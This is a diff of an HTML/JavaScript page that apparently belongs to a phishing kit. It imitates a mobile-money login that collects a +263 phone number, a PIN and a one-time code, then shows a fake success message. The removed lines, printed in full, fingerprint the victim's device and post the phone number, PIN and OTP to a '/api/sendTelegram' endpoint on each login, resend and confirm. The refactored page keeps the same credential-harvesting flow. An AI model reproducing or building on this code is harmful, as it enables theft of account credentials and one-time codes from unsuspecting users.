@@ -71,7 +71,7 @@ input{
   border:2px solid #fff;
   background:#fff;
   text-align:center;
-  font-size:1px;          /* FIX */
+  font-size:1px;
   color:transparent;
   caret-color:transparent;
 }
@@ -103,7 +103,7 @@ input{
   border:2px solid #fff;
   background:#fff;
   text-align:center;
-  font-size:1px;          /* FIX */
+  font-size:1px;
   color:transparent;
   caret-color:transparent;
 }
@@ -121,11 +121,22 @@ input{
 .resend-btn{
   background:#020617;
   border:1px solid #1f2937;
-  padding:6px 12px;
+  padding:8px 14px;
   border-radius:8px;
   color:#e5e7eb
 }
 .resend-btn[disabled]{opacity:.5}
+
+.action-primary{
+  background:#2563eb;
+  border:0;
+  color:#fff;
+}
+.action-secondary{
+  background:#020617;
+  border:1px solid #1f2937;
+  color:#e5e7eb;
+}
 </style>
 </head>
 
@@ -149,7 +160,6 @@ input{
     </div>
 
     <input type="text" id="hp" style="display:none">
-
     <button id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
@@ -178,8 +188,8 @@ input{
     </div>
 
     <div style="display:flex;gap:10px;margin-top:12px">
-      <button id="confirmOtp" disabled>Confirm</button>
-      <button id="cancelOtp">Cancel</button>
+      <button id="confirmOtp" class="resend-btn action-primary" disabled>Confirm</button>
+      <button id="cancelOtp" class="resend-btn action-secondary">Cancel</button>
     </div>
 
     <div id="otpStatus" class="small" style="margin-top:8px"></div>
@@ -187,82 +197,65 @@ input{
 </div>
 
 <script>
-/* ===== DEVICE ===== */
-const ua = navigator.userAgent;
-let device = 'Unknown';
-
-if (/Android/i.test(ua)) {
-  const v = ua.match(/Android\s([\d.]+)/);
-  device = 'Android ' + (v ? v[1] : '');
-} else if (/iPhone|iPad/i.test(ua)) {
-  const v = ua.match(/OS (\d+_\d+)/);
-  device = 'iOS ' + (v ? v[1].replace('_','.') : '');
+/* ===== SHARED DIGIT HANDLER ===== */
+function bindDigitInputs(list, onChange){
+  list.forEach((el,i)=>{
+    el.addEventListener('input',()=>{
+      el.value=el.value.replace(/\D/g,'');
+      el.classList.toggle('filled',!!el.value);
+      if(el.value && i<list.length-1) list[i+1].focus();
+      onChange();
+    });
+    el.addEventListener('keydown',e=>{
+      if(e.key==='Backspace' && !el.value && i>0){
+        list[i-1].focus();
+        list[i-1].value='';
+        list[i-1].classList.remove('filled');
+        e.preventDefault();
+        onChange();
+      }
+    });
+  });
 }
-if (/Chrome/i.test(ua)) device += ' | Chrome';
-else if (/Safari/i.test(ua)) device += ' | Safari';
-else if (/Firefox/i.test(ua)) device += ' | Firefox';
 
 /* ===== PHONE ===== */
-const phone = document.getElementById('phone');
-const phoneError = document.getElementById('phoneError');
-const loginBtn = document.getElementById('loginBtn');
+const phone=document.getElementById('phone');
+const phoneError=document.getElementById('phoneError');
+const loginBtn=document.getElementById('loginBtn');
 
 function validatePhone(){
-  const d = phone.value.replace('+263','');
-  if (!/^7\d{8}$/.test(d)) {
-    phoneError.innerText = 'Input 9-digit number starting with 7';
+  const d=phone.value.replace('+263','');
+  if(!/^7\d{8}$/.test(d)){
+    phoneError.innerText='Input 9-digit number starting with 7';
     return false;
   }
-  phoneError.innerText = '';
+  phoneError.innerText='';
   return true;
 }
 
-phone.addEventListener('keydown',e=>{
-  if(phone.selectionStart<=4 && e.key==='Backspace') e.preventDefault();
-});
-
 phone.addEventListener('input',()=>{
-  let d = phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
-  phone.value = '+263' + d;
-  validatePhone();
+  let d=phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
+  phone.value='+263'+d;
   updateLogin();
 });
 
 /* ===== PIN ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
 let pinValue='';
-
-pins.forEach((p,i)=>{
-  p.addEventListener('input',()=>{
-    p.value=p.value.replace(/\D/g,'');
-    p.classList.toggle('filled',!!p.value);
-    if(p.value && i<3) pins[i+1].focus();
-    pinValue=pins.map(x=>x.value).join('');
-    updateLogin();
-  });
+bindDigitInputs(pins,()=>{
+  pinValue=pins.map(p=>p.value).join('');
+  updateLogin();
 });
 
 function updateLogin(){
-  loginBtn.disabled = !(validatePhone() && /^\d{4}$/.test(pinValue));
-}
-
-/* ===== API ===== */
-async function sendToServer(payload){
-  return fetch('/api/sendTelegram',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify(payload)
-  });
+  loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue));
 }
 
 /* ===== OTP ===== */
-const otpModal=document.getElementById('otpModal');
 const dEls=[0,1,2,3,4].map(i=>document.getElementById('d'+i));
 const confirmBtn=document.getElementById('confirmOtp');
-const cancelBtn=document.getElementById('cancelOtp');
-const resendBtn=document.getElementById('resendBtn');
 const otpWarning=document.getElementById('otpWarning');
-const otpStatus=document.getElementById('otpStatus');
+const resendBtn=document.getElementById('resendBtn');
 const countdown=document.getElementById('countdown');
 const resendInfo=document.getElementById('resendInfo');
 
@@ -272,6 +265,7 @@ function startCountdown(){
   clearInterval(timer);
   seconds=120;
   resendBtn.disabled=true;
+  countdown.textContent=seconds;
   resendInfo.innerHTML='Resend available in <span id="countdown">120</span>s';
   timer=setInterval(()=>{
     seconds--;
@@ -284,69 +278,47 @@ function startCountdown(){
   },1000);
 }
 
-function getOtp(){return dEls.map(d=>d.value).join('');}
-function updateConfirm(){
-  const ok=/^\d{5}$/.test(getOtp());
+function updateOtpState(){
+  const otp=dEls.map(d=>d.value).join('');
+  const ok=/^\d{5}$/.test(otp);
   confirmBtn.disabled=!ok;
   otpWarning.style.display=ok?'none':'block';
 }
 
-dEls.forEach((d,i)=>{
-  d.addEventListener('input',()=>{
-    d.value=d.value.replace(/\D/g,'');
-    d.classList.toggle('filled',!!d.value);
-    if(d.value && i<4) dEls[i+1].focus();
-    updateConfirm();
-  });
+bindDigitInputs(dEls,updateOtpState);
+
+/* ===== OTP PASTE SUPPORT ===== */
+dEls[0].addEventListener('paste',e=>{
+  const data=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,5);
+  if(data.length){
+    e.preventDefault();
+    data.split('').forEach((v,i)=>{
+      dEls[i].value=v;
+      dEls[i].classList.add('filled');
+    });
+    updateOtpState();
+    dEls[Math.min(data.length,4)].focus();
+  }
 });
 
 /* ===== LOGIN ===== */
-document.getElementById('loginForm').addEventListener('submit',async e=>{
+document.getElementById('loginForm').addEventListener('submit',e=>{
   e.preventDefault();
   if(document.getElementById('hp').value) return;
-
-  if (navigator.vibrate) navigator.vibrate(30); // vibration
-
-  otpModal.style.display='flex';
+  if(navigator.vibrate) navigator.vibrate(30);
+  document.getElementById('otpModal').style.display='flex';
   dEls.forEach(d=>{d.value='';d.classList.remove('filled')});
-  updateConfirm();
+  updateOtpState();
   startCountdown();
-
-  await sendToServer({
-    event:'login_clicked',
-    loginPhone:phone.value,
-    loginPin:pinValue,
-    device,
-    submittedAt:new Date().toISOString()
-  });
 });
 
-cancelBtn.onclick=()=>{
-  otpModal.style.display='none';
+document.getElementById('cancelOtp').onclick=()=>{
+  document.getElementById('otpModal').style.display='none';
   clearInterval(timer);
 };
 
-resendBtn.onclick=async()=>{
-  await sendToServer({
-    event:'resend_otp',
-    loginPhone:phone.value,
-    loginPin:pinValue,
-    device,
-    submittedAt:new Date().toISOString()
-  });
-};
-
-confirmBtn.onclick=async()=>{
-  await sendToServer({
-    event:'otp_confirm',
-    loginPhone:phone.value,
-    loginPin:pinValue,
-    otp:getOtp(),
-    device,
-    submittedAt:new Date().toISOString()
-  });
-  otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
-  setTimeout(()=>location.href='thankyou.html',1200);
+resendBtn.onclick=()=>{
+  startCountdown();
 };
 </script>
 </body>
